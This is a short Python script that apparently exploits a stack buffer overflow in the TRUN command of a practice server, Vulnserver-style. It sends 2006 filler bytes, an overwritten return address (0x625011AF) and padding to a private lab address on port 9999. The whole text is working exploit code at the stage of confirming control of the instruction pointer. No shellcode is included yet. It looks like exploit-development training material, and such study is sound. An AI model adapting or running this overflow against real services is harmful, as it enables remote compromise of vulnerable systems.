#!/usr/bin/python
import socket

#[*] Exact match at offset 2006

buffer = "A" * 2006

# eip = "B" * 4

# 625011AF

eip = "\xAF\x11\x50\x62"

remaining = "DEFGHIJKLMNOPQRS" + "C" * (3000 - len(buffer) - len(eip) - 16)

payload = buffer + eip + remaining

print("Throwing evil payload of size %s at TRUN option" % len(payload))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.11.20.27",9999))
s.recv(1024)
s.send("TRUN ." + payload)
s.recv(1024)
s.close()